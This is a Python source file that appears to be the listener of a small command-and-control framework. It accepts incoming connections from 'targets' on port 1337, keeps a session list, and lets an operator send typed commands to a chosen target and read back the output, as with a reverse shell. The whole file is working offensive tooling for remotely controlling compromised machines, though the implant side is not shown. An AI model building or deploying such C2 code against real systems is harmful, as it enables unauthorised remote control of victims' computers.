import socket
import sys
import threading

def banner():
    print("   ___            _ _         ___ ____  _ \n  / _ \__ _  __ _| (_) __ _  / __\___ \(_)\n / /_)/ _` |/ _` | | |/ _` |/ /    __) | |\n/ ___/ (_| | (_| | | | (_| / /___ / __/| |\n\/    \__,_|\__, |_|_|\__,_\____/|_____|_|\n            |___/                         \n")

def comm_in(targ_id):
    print("[+] Awaiting response...")
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input("@> ")
        comm_out(targ_id, message)
        if message == "exit":
            targ_id.send(message.encode())
            targ_id.close()
            break

        if message == "background":
            break
        
        else:
            response = comm_in(targ_id)
            if response == "exit":
                print("[!] The client has terminated the session.")
                targ_id.close()
                break
            print(response)

def listener_handler():
    sock.bind((host_ip, host_port))
    print("[+] Awaiting connection from client...")
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()


def comm_handler():
    while True:
        if kill_flag == 1:
            break

        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(f"\n[+] Connection received from {remote_ip[0]}\n" + "@> ", end="")
        
        except:
            pass


if __name__ == "__main__":
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        host_ip = "127.0.0.1"
        host_port = 1337
    
    except IndexError:
        print("[-] Command line argument(s) missing. Please try again.")
    
    except Exception as e:
        print(e)
    
    listener_handler()
    
    while True:
        try:
            command = input("@> ")
            
            if command.split(" ")[0] == "sessions":
                session_counter = 0
                
                if command.split(" ")[1] == "-l":
                    print("Session" + " " * 10 + "Target")
                    
                    for target in targets:
                        print(str(session_counter) + " " * 16 + target[1])
                        session_counter += 1
                
                if command.split(" ")[1] == "-i":
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        
        except KeyboardInterrupt:
            print("\n[+] Keyboard interrupt issued.")
            kill_flag = 1
            sock.close()
            break
